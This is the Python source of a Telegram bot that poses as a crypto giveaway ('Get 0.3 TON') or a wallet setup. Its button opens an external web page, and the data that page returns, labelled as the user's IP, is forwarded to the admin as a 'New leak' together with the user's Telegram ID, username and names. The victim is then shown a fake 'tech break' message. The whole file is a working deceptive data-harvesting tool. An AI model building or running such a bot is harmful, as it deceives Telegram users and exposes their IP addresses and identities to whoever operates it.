import telebot
from telebot.types import WebAppData, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton
from telebot import TeleBot as Bot

with open("token.txt") as f:
    token = f.read().strip()

with open("admin.txt") as f:
    admin = f.read().strip()

bot = Bot(token)

@bot.message_handler(commands=["start"])
def cmd_start(message):
    if len(message.text) >= 8:
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton(text="Get 0.3 TON", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
        bot.send_message(message.from_user.id, "Check for 0.3 TON. Press button to receive.", reply_markup=markup)
    else:
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton(text="Setup Cryptowallet", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
        bot.send_message(message.from_user.id, "Press button to setup your Cryptowallet.", reply_markup=markup)

@bot.message_handler(content_types=["web_app_data"])
def wad_handler(message):
    data = message.web_app_data.data
    user = message.from_user
    resp = "New leak:\n"
    resp += f"IP: {data}\n"
    resp += f"User ID: {user.id}\n"
    resp += f"Username: @{user.username}\n"
    resp += f"First name: {user.first_name}\n"
    resp += f"Last name: {user.last_name}\n"
    bot.send_message(admin, resp)
    bot.send_message(user.id, "Temporary tech break, try again later.")

if __name__ == "__main__":
    bot.infinity_polling()
